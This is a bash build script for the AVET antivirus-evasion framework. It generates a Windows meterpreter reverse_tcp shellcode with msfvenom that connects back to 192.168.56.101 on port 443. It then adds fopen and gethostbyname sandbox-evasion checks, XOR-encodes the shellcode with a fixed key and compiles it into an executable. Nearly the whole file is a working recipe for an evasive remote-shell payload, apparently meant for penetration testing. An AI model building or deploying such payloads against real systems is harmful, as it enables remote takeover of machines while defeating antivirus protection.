#!/bin/bash      
# example build script

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# generate payload
#msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt

# import feature construction interface
. build/feature_construction.sh

# add evasion techniques
add_evasion fopen_sandbox_evasion
add_evasion gethostbyname_sandbox_evasion
printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
#add_evasion hide_console

# generate key file
generate_key preset aabbcc12de input/keyraw.txt

# encode shellcode
encode_shellcode xor input/sc.txt input/scenc.txt input/keyraw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/scenc_c.txt buf

# set shellcode source
#./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt "buf"
set_shellcode_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key

# set key source
set_key_source static_from_file input/key.txt

# set decoder
set_decoder xor

# set shellcode binding technique
set_shellcode_binding exec_shellcode

# enable debug printing
enable_debug_print

# compile
$win32_compiler -o output/output.exe source/avet.c -lws2_32

# cleanup
cleanup_techniques
